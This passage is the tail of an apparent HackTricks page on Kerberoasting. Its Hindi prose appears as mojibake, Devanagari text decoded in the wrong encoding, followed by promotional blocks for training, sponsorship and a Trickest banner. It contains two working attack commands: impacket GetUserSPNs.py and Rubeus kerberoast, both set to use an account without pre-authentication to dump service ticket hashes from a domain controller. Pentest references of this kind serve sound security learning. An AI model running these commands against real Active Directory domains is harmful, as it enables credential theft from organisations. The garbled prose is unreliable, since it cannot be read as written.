рдЖрдкрдХреЛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреА рд╕реВрдЪреА рдкреНрд░рджрд╛рди рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдХреНрдпреЛрдВрдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдЗрд╕ рддрдХрдиреАрдХ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ LDAP рдХреНрд╡реЗрд░реА рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рд╡реИрдз рдЦрд╛рддрд╛ рдирд╣реАрдВ рд╣реИред
{% endhint %}

#### рд▓рд┐рдирдХреНрд╕

* [impacket/GetUserSPNs.py from PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus from PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## рд╕рдВрджрд░реНрдн

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд рд╣реЛ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рдЬреБрдбрд╝реЗрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рд╕реЗ рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдХреЛред

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ **рд╡рд░реНрдХрдлрд╝реНрд▓реЛ** рдмрдирд╛рдПрдВ рдФрд░ **рд╕реНрд╡рдд: рдХрд╛рд░реНрдпрдХреНрд░рдорд┐рдд** рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ **рд╕рдмрд╕реЗ рдЙрдиреНрдирдд** рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реИред\
рдЖрдЬ рд╣реА рдкрд╣реБрдВрдЪреЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
